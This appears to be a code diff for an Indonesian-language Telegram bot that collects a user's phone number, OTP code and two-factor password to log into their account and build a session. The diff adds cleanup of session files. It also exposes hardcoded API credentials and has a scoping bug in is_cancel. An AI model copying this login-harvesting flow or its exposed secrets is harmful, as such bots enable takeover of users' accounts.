@@ -1,4 +1,4 @@
-import asyncio
+import asyncio, os
 
 from c import bot
 from pyromod import listen
@@ -26,6 +26,8 @@ async def genStr(_, msg: Message):
     chat = msg.chat
     api_id = 19685518
     api_hash = "33bf1d586e5fdfd9e66aaa52a576935a"
+    filename = f"kom{msg.from_user.id}.session"
+    filenamee = f"kom{msg.from_user.id}.session-journal"
     while True:
         number = await bot.ask(chat.id, PHONE_NUMBER_TEXT)
         if not number.text:
@@ -52,18 +54,24 @@ async def genStr(_, msg: Message):
         code = await client.send_code(phone)
         await asyncio.sleep(1)
     except FloodWait as e:
+        os.remove(filename)
+        os.remove(filenamee)
         await msg.reply(f"Sabar ngab terlalu banyak mencoba tunggu {e.x} detik")
         return
     except ApiIdInvalid:
         await msg.reply("API ID and API Hash Tidak ada.\n\nKlik /start Coba lagi ngab.")
         return
     except PhoneNumberInvalid:
+        os.remove(filename)
+        os.remove(filenamee)
         await msg.reply("Nomormu fake ngab.\n\nKlik /start Coba lagi ngab.")
         return
     try:
         otp = await bot.ask(chat.id, "Kode OTP Sudah di kirim ke nomermu ngab,")
 
     except Exception as e:
+        os.remove(filename)
+        os.remove(filenamee)
         await msg.reply("Dahlah waktu habis ngab sudah 5 min.\nTekan /start Coba lagi ngab.")
         return
     if await is_cancel(msg, otp.text):
@@ -72,9 +80,13 @@ async def genStr(_, msg: Message):
     try:
         await client.sign_in(phone, code.phone_code_hash, phone_code=' '.join(str(otp_code)))
     except PhoneCodeInvalid:
+        os.remove(filename)
+        os.remove(filenamee)
         await msg.reply("Kode salah cuk.\n\nKlik /start Coba lagi ngab.")
         return
     except PhoneCodeExpired:
+        os.remove(filename)
+        os.remove(filenamee)
         await msg.reply("Kode kadaluarsa.\n\nKlik /start Coba lagi ngab.")
         return
     except SessionPasswordNeeded:
@@ -93,9 +105,13 @@ async def genStr(_, msg: Message):
         try:
             await client.check_password(new_code)
         except Exception as e:
+            os.remove(filename)
+            os.remove(filenamee)
             await msg.reply(f"**ERROR:** `{str(e)}`")
             return
     except Exception as e:
+        os.remove(filename)
+        os.remove(filenamee)
         await bot.send_message(chat.id ,f"**ERROR:** `{str(e)}`")
         return
     try:
@@ -112,12 +128,18 @@ async def genStr(_, msg: Message):
           await asyncio.sleep(3)
         await client.send_message(LOG, "GUA MATI")
         await client.disconnect()
+        os.remove(filename)
+        os.remove(filenamee)
     except Exception as e:
+        os.remove(filename)
+        os.remove(filenamee)
         await bot.send_message(chat.id ,f"**ERROR:** `{str(e)}`")
         return
 
 async def is_cancel(msg: Message, text: str):
     if text.startswith("/cancel"):
+        os.remove(filename)
+        os.remove(filenamee)
         await msg.reply("Proses di batalkan.")
         return True
     return False
